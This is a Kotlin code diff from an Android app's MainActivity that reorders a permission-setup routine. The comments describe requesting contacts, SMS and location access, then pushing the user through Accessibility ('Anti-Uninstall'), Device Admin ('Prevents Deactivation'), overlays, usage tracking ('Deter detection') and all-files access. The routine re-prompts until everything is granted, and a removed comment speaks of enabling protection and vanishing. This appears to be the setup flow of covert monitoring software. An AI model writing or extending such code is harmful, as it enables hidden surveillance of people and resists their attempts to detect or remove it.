@@ -105,7 +105,7 @@ class MainActivity : AppCompatActivity() {
         updateStatusText(ADexForegroundService.lastPairCode)
         updatePermissionChecklistText()
 
-        // AUTO-PILOT: Continuously re-prompt for missing permissions as soon as they return from Settings.
+        // AUTO-PILOT: Continuously re-prompt for missing permissions.
         if (!allCriticalPermissionsGranted()) {
             runPermissionSetup()
         } else {
@@ -114,59 +114,45 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun runPermissionSetup() {
-        // 1. Accessibility Service (CRITICAL for Auto-Granting & Anti-Uninstall)
-        if (!PermissionHelper.isAccessibilityServiceEnabled(this)) {
-            startActivity(PermissionHelper.accessibilitySettingsIntent())
-            return
-        }
-
-        // 2. Runtime permissions (Contacts, SMS, Location, etc.)
+        // 1. Blast ALL runtime permissions (Old Style)
         val missing = PermissionHelper.missingRuntimePermissions(this)
         if (missing.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, missing.toTypedArray(), 1001)
             return
         }
 
-        // 3. Android 13+ Specifics
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            val permissions = arrayOf(
-                android.Manifest.permission.POST_NOTIFICATIONS,
-                android.Manifest.permission.READ_MEDIA_IMAGES,
-                android.Manifest.permission.READ_MEDIA_VIDEO,
-                android.Manifest.permission.READ_MEDIA_AUDIO
-            )
-            val toRequest = permissions.filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
-            if (toRequest.isNotEmpty()) {
-                ActivityCompat.requestPermissions(this, toRequest.toTypedArray(), 1002)
-                return
-            }
-        }
-
-        // 4. System Alert Window (Overlay for Blocking)
-        if (!PermissionHelper.hasOverlayPermission(this)) {
-            startActivity(PermissionHelper.overlaySettingsIntent(this))
+        // 2. High-Importance Special Settings (Sequential Guides)
+        
+        // Accessibility (Essential for automation & Anti-Uninstall)
+        if (!PermissionHelper.isAccessibilityServiceEnabled(this)) {
+            startActivity(PermissionHelper.accessibilitySettingsIntent())
             return
         }
 
-        // 5. Usage Access (Monitoring App Launches)
-        if (!PermissionHelper.hasUsageStatsPermission(this)) {
-            startActivity(PermissionHelper.usageAccessSettingsIntent())
-            return
-        }
-
-        // 6. Device Admin (Anti-Deactivation & Remote Lock)
+        // Device Admin (Prevents Deactivation)
         if (!PermissionHelper.isDeviceAdminEnabled(this)) {
             startActivity(PermissionHelper.deviceAdminSettingsIntent(this))
             return
         }
 
-        // 7. All Files Access (Deep Storage Inspection)
+        // Display Overlays (Blocking Screens)
+        if (!PermissionHelper.hasOverlayPermission(this)) {
+            startActivity(PermissionHelper.overlaySettingsIntent(this))
+            return
+        }
+
+        // App Usage Tracking (Deter detection)
+        if (!PermissionHelper.hasUsageStatsPermission(this)) {
+            startActivity(PermissionHelper.usageAccessSettingsIntent())
+            return
+        }
+
+        // Storage Management (File Explorer & DB access)
         if (!PermissionHelper.hasAllFilesAccess()) {
             startActivity(PermissionHelper.allFilesAccessIntent(this))
             return
         }
         
-        // Everything granted -> Enable protection and vanish
         maybeEnableShieldAfterPermissions()
     }
 
